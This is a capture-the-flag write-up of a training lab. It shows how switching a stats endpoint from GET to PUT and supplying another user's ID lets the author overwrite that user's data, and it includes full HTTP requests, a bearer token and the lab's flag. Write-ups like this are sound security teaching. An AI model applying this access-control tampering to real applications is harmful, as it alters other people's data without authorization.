---
title: "Sokudo Broken Access Control Verb Tampering"
date: 2025-11-28
author: Shawn Szczepkowski
---

Today we will be covering the Sokudo Broken Access Control lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.

We start out by registering a user and checking our current permissions:
#### User registration request
```http
POST /api/register HTTP/2
Host: 75ff57597ba6.labs.bugforge.io
Content-Length: 85
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Origin: https://75ff57597ba6.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://75ff57597ba6.labs.bugforge.io/register
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"username":"test","email":"test@test.com","password":"test123","full_name":"tester"
```

#### User registration response
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Fri, 28 Nov 2025 21:05:36 GMT
Etag: W/"e6-2R16AdnEYDxWHzKZpoF/z27D9ls"
X-Powered-By: Express
Content-Length: 230

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0MzYzOTM2fQ.v3_JDq8fYhXgScEykBDg0uTiuOO3EYPCbjldxIsMflg","user":{"id":4,"username":"test","email":"test@test.com","full_name":"tester"}}
```


While exploring different endpoints we notice a GET request to `/api/stats` that retrieves out current users stats for the apps typing game:
#### Stats request
```sh
GET /api/stats HTTP/2
Host: 75ff57597ba6.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0MzYzOTM2fQ.v3_JDq8fYhXgScEykBDg0uTiuOO3EYPCbjldxIsMflg
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://75ff57597ba6.labs.bugforge.io/dashboard
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

#### Stats response
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Fri, 28 Nov 2025 21:07:44 GMT
Etag: W/"12a-8OhsPt4YgB+8D8nlUYvRja0peVk"
X-Powered-By: Express
Content-Length: 298

{"id":3,"user_id":4,"total_sessions":1,"best_wpm":55.48676675437238,"avg_wpm":55.48676675437238,"total_chars_typed":239,"total_time_seconds":51.688,"personal_bests":[{"id":1,"user_id":4,"duration":60,"char_type":"mixed","wpm":55.48676675437238,"accuracy":100,"session_date":"2025-11-28 21:07:26"}]}
```

As part of our normal testing we should be checking to see if endpoints accept different request methods, and what that can potentially allow us to do that would be unintended by the developers.

In this case I was able to discover that `/api/stats` also returns an interesting response when we attempt to send a PUT request:

#### PUT request
```http
PUT /api/stats HTTP/2
Host: 75ff57597ba6.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0MzYzOTM2fQ.v3_JDq8fYhXgScEykBDg0uTiuOO3EYPCbjldxIsMflg
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://75ff57597ba6.labs.bugforge.io/dashboard
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

#### PUT response
```http
HTTP/2 400 Bad Request
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Fri, 28 Nov 2025 21:11:14 GMT
Etag: W/"25-f04jSfTwTb7aXeRDDKhO5si8//c"
X-Powered-By: Express
Content-Length: 37

{"error":"No valid fields to update"}
```


The ability to change ones stats is not present anywhere in the applications UI and does not appear intended, so let's send some data and see what it returns:

#### PUT request with data
```http
PUT /api/stats HTTP/2
Host: 75ff57597ba6.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0MzYzOTM2fQ.v3_JDq8fYhXgScEykBDg0uTiuOO3EYPCbjldxIsMflg
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://75ff57597ba6.labs.bugforge.io/dashboard
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Content-Length: 298
Content-Type: application/json

{"id":3,"user_id":1,"total_sessions":1,"best_wpm":55.48676675437238,"avg_wpm":55.48676675437238,"total_chars_typed":239,"total_time_seconds":51.688,"personal_bests":[{"id":1,"user_id":4,"duration":60,"char_type":"mixed","wpm":55.48676675437238,"accuracy":100,"session_date":"2025-11-28 21:07:26"}]}
```
- In this case I added a different `user_id` to see if we can update another users stats. Don't forget to add the `Content-Type: application/json` header when you convert the GET request to a PUT or you may not get the desired results and may miss the vulnerability.


It looks like we can in fact update another users stats and we are greeted with our flag:
#### PUT request with data response
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Fri, 28 Nov 2025 21:13:15 GMT
Etag: W/"57-lQyoZLzNQ6mWuhRWtsx6wqVbuNs"
X-Powered-By: Express
Content-Length: 87

{"message":"Stats updated successfully","flag":"bug{7e0e8758339a1c20c8667a3757c8cab4}"}
```
